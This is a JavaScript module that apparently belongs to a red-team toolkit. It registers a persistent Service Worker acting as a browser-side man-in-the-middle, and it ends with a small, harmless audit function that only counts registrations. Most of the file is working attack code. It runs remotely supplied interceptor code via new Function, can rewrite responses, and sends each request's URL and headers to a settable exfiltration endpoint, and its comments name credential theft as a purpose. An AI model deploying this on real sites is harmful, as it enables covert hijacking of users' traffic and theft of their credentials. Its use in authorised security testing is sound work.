/**
 * service_worker_mitm.js — Production‑grade Service Worker Man‑in‑the‑Middle & Audit
 *
 * This module provides:
 *   1. `injectMitMWorker()` – registers a persistent Service Worker that can
 *      intercept, modify, and exfiltrate all network requests made by the
 *      origin, effectively acting as a browser‑side MitM proxy.
 *   2. Default export – a Pinpoint‑compatible `Service_Worker_Audit` that
 *      reports Service Worker API availability, active registrations, and
 *      active controller state.
 *
 * Designed for authorised red‑team engagements and security research only.
 * Service Workers require a secure context (HTTPS or localhost).
 */

// ---------------------------------------------------------------------------
// 1. Dynamic Service Worker Script Generator
// ---------------------------------------------------------------------------

/**
 * Creates the source code of a Service Worker that intercepts fetch events
 * and can receive commands from the main page via postMessage.
 *
 * @param {Object} config
 * @param {string} [config.payloadCode]  – custom JavaScript code to run in the
 *        'fetch' event. It receives a FetchEvent with `event.request` and
 *        can call `event.respondWith()` or `event.waitUntil()`. For convenience,
 *        the generated script also exposes a `handleFetch(event)` function that
 *        can be overridden via messages.
 * @returns {string} complete Service Worker code.
 */
function generateServiceWorkerScript(config = {}) {
    const { payloadCode = '' } = config;

    // The SW will:
    //  - Log activation
    //  - Listen for `message` events to update behaviour or exfiltrate data
    //  - For every fetch, call a dynamic handler that can be set from the main page
    //  - Optionally exfiltrate request/response data back to the client
    return `
'use strict';

// Internal state – can be updated via postMessage
let interceptor = null;           // custom function called on each fetch
let exfiltrationEndpoint = null;  // optional URL to send request logs

// Default handler: just proxy the request unchanged
async function defaultHandler(event) {
  return fetch(event.request);
}

// Interceptor wrapper
async function handleFetch(event) {
  if (typeof interceptor === 'function') {
    try {
      return await interceptor(event);
    } catch (e) {
      console.error('[SW] Interceptor error:', e);
      // Fall back to default
    }
  }
  return defaultHandler(event);
}

// Install & activate immediately, claim clients
self.addEventListener('install', (event) => {
  console.log('[SW] Installed');
  self.skipWaiting();
});

self.addEventListener('activate', (event) => {
  console.log('[SW] Activated');
  event.waitUntil(self.clients.claim());
});

// Main fetch interception
self.addEventListener('fetch', (event) => {
  event.respondWith(handleFetch(event));

  // Optional exfiltration of request URL
  if (exfiltrationEndpoint) {
    try {
      const { url, method, headers } = event.request;
      const log = { url, method, headers: [...headers], timestamp: Date.now() };
      // Fire‑and‑forget (do not block the response)
      event.waitUntil(
        fetch(exfiltrationEndpoint, {
          method: 'POST',
          mode: 'no-cors',
          body: JSON.stringify(log),
          headers: { 'Content-Type': 'application/json' }
        }).catch(() => {})
      );
    } catch (_) {}
  }
});

// Receive commands from the controlling page
self.addEventListener('message', (event) => {
  const { type, payload } = event.data || {};
  if (type === 'SET_INTERCEPTOR') {
    // Expect payload to be a stringified function (or code)
    try {
      // eslint-disable-next-line no-new-func
      interceptor = new Function('event', payload.code);
      console.log('[SW] Custom interceptor installed');
    } catch (e) {
      console.error('[SW] Failed to set interceptor:', e);
    }
  } else if (type === 'SET_EXFIL') {
    exfiltrationEndpoint = payload.endpoint;
    console.log('[SW] Exfiltration endpoint set:', exfiltrationEndpoint);
  } else if (type === 'RESET') {
    interceptor = null;
    exfiltrationEndpoint = null;
    console.log('[SW] Reset to default behaviour');
  }
  // Respond to confirm
  event.ports[0]?.postMessage({ success: true });
});

// Custom payload code (if provided at injection time)
${payloadCode}
`;
}

// ---------------------------------------------------------------------------
// 2. Main injection function
// ---------------------------------------------------------------------------

/**
 * Injects a persistent Service Worker that can intercept and modify all
 * fetch requests on the current origin (man‑in‑the‑middle).
 *
 * By default, the function generates a minimal SW script that proxies all
 * traffic untouched. You can then send commands via the returned controller
 * object to modify the behaviour (e.g. inject custom JavaScript into HTML
 * responses, redirect requests, exfiltrate credentials, etc.).
 *
 * **Requirements:**
 * - Page must be served over HTTPS (or localhost). The function checks
 *   `window.isSecureContext` and will throw if not secure.
 * - The Service Worker script is created via a `Blob` URL. While Blob URLs
 *   are not universally supported for Service Worker registration, many
 *   modern browsers (Chrome, Edge, Opera) do allow same‑origin Blob URLs.
 *   If registration fails, the function attempts to use a fallback URL
 *   (`options.fallbackWorkerUrl`).
 *
 * @param {Object} [options={}]
 * @param {string} [options.scope='/']             – registration scope.
 * @param {string} [options.payloadCode='']         – JS code to run inside the SW (see docs).
 * @param {string} [options.fallbackWorkerUrl=null] – if Blob fails, try this URL.
 * @param {boolean} [options.forceUnregister=false]  – unregister existing SW first.
 * @param {number} [options.timeout=10000]          – max wait for activation (ms).
 * @returns {Promise<Object>} controller object with `sendCommand()`, `unregister()`, etc.
 */
export async function injectMitMWorker(options = {}) {
    const {
        scope = '/',
        payloadCode = '',
        fallbackWorkerUrl = null,
        forceUnregister = false,
        timeout = 10000,
    } = options;

    // 1. Security checks
    if (!window.isSecureContext) {
        throw new Error('[injectMitMWorker] Service Workers require a secure context (HTTPS or localhost).');
    }
    if (!('serviceWorker' in navigator)) {
        throw new Error('[injectMitMWorker] Service Worker API not supported.');
    }

    // 2. Unregister existing SW if requested
    if (forceUnregister) {
        const existingReg = await navigator.serviceWorker.getRegistration(scope);
        if (existingReg) {
            const success = await existingReg.unregister();
            if (!success) {
                throw new Error('[injectMitMWorker] Failed to unregister existing Service Worker.');
            }
            // Wait for browser to remove it
            await new Promise(r => setTimeout(r, 200));
        }
    }

    // 3. Generate SW script
    const swCode = generateServiceWorkerScript({ payloadCode });
    const blob = new Blob([swCode], { type: 'application/javascript' });
    const swUrl = URL.createObjectURL(blob);

    // 4. Attempt registration with Blob URL
    let registration = null;
    try {
        registration = await navigator.serviceWorker.register(swUrl, { scope });
    } catch (err) {
        console.warn('[injectMitMWorker] Blob URL registration failed:', err);
        URL.revokeObjectURL(swUrl);

        // Try fallback URL if provided
        if (fallbackWorkerUrl) {
            try {
                registration = await navigator.serviceWorker.register(fallbackWorkerUrl, { scope });
            } catch (fallbackErr) {
                throw new Error(`[injectMitMWorker] Failed to register with fallback URL: ${fallbackErr.message}`);
            }
        } else {
            throw new Error('[injectMitMWorker] Service Worker registration failed and no fallback URL provided.');
        }
    }

    // 5. Wait for activation
    const sw = registration.installing || registration.waiting || registration.active;
    if (!sw) {
        throw new Error('[injectMitMWorker] No Service Worker found after registration.');
    }

    await new Promise((resolve, reject) => {
        const timer = setTimeout(() => {
            reject(new Error('[injectMitMWorker] Service Worker activation timed out.'));
        }, timeout);

        const checkState = () => {
            if (sw.state === 'activated') {
                clearTimeout(timer);
                resolve();
            }
        };

        sw.addEventListener('statechange', () => {
            checkState();
        });
        checkState(); // in case already activated
    });

    // 6. Build controller object
    const controller = {
        registration,
        scope,
        sw,
        /**
         * Sends a command to the registered Service Worker.
         *
         * @param {string} type – command type (e.g., 'SET_INTERCEPTOR', 'SET_EXFIL', 'RESET')
         * @param {Object} payload – command payload
         * @returns {Promise<any>} response from the SW.
         */
        async sendCommand(type, payload = {}) {
            return new Promise((resolve, reject) => {
                const messageChannel = new MessageChannel();
                messageChannel.port1.onmessage = (event) => {
                    resolve(event.data);
                };
                // Use the active worker if available, else fallback
                const target = registration.active || sw;
                target.postMessage({ type, payload }, [messageChannel.port2]);
                // Timeout safety
                setTimeout(() => reject(new Error('SW command timeout')), 5000);
            });
        },

        /**
         * Convenience: set a custom fetch interceptor.
         * @param {string} code – a JavaScript function body as a string that will be
         *        evaluated in the SW context. The function receives a FetchEvent.
         *        Example: `return fetch(event.request)` or `return new Response('blocked')`
         */
        async setInterceptor(code) {
            return this.sendCommand('SET_INTERCEPTOR', { code });
        },

        /**
         * Convenience: set an exfiltration endpoint.
         * @param {string} endpoint – URL to which request logs will be POSTed.
         */
        async setExfiltrationEndpoint(endpoint) {
            return this.sendCommand('SET_EXFIL', { endpoint });
        },

        /**
         * Reset the Service Worker to default (pass‑through) behaviour.
         */
        async reset() {
            return this.sendCommand('RESET');
        },

        /**
         * Unregister the Service Worker and release resources.
         */
        async unregister() {
            const success = await registration.unregister();
            URL.revokeObjectURL(swUrl);
            return success;
        }
    };

    return controller;
}

// ---------------------------------------------------------------------------
// 3. Pinpoint‑compatible Service_Worker_Audit (default export)
// ---------------------------------------------------------------------------

const pinpointModule = {
    id: 'service_worker_mitm',
    title: 'Service_Worker_Audit',
    level: 4, // High‑Fidelity HW Exploits
    info: 'Audits navigator.serviceWorker support and active registration count for current origin.',
    steps: [
        'Check navigator.serviceWorker API support.',
        'Query serviceWorker registrations.',
    ],
    run: async () => {
        if (!('serviceWorker' in navigator)) {
            return {
                supported: false,
                message: 'Service Worker API is not supported by this browser.',
            };
        }

        try {
            const regs = await navigator.serviceWorker.getRegistrations();
            return {
                supported: true,
                activeRegistrationCount: regs.length,
                hasActiveController: !!navigator.serviceWorker.controller,
            };
        } catch (e) {
            return {
                supported: true,
                error: e.message,
            };
        }
    },
};

export default pinpointModule;